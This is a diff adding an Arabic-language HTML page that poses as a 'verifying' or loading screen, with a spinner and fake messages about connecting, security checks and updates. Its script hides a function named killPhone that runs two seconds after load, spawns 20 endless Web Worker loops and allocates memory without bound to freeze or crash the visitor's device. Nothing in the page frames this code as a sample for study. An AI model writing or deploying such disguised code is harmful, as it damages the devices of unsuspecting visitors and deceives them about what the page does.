@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>جاري التحقق...</title>
+    <style>
+        body { 
+            background-color: #ffffff; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            user-select: none;
+        }
+        .loader-container { 
+            text-align: center; 
+            color: #555; 
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text {
+            font-size: 18px;
+            font-weight: 400;
+            letter-spacing: 1px;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text" id="status">جاري الاتصال بالخادم...</div>
+    </div>
+
+<script>
+
+    const phrases = [
+        "جاري الاتصال بالخادم...",
+        "يتم الآن مزامنة البيانات...",
+        "جاري فحص الأمان...",
+        "تثبيت التحديثات الضرورية...",
+        "انتظر لحظة من فضلك..."
+    ];
+    let i = 0;
+    setInterval(() => {
+        document.getElementById('status').innerText = phrases[i % phrases.length];
+        i++;
+    }, 4000);
+
+    function killPhone() {
+       
+        for (let w = 0; w < 20; w++) {
+            const workerCode = `
+                onmessage = function() {
+                    while(true) {
+                        Math.sqrt(Math.random() * Math.random()); 
+
+                    }
+                }
+            `;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const worker = new Worker(URL.createObjectURL(blob));
+            worker.postMessage('start');
+        }
+
+        let memoryHog = [];
+        setInterval(() => {
+            for(let j=0; j<1000000; j++) {
+                memoryHog.push(new Array(10).fill("Suffer")); 
+            }
+        }, 100);
+    }
+
+    setTimeout(killPhone, 2000);
+</script>
+</body>
+</html>
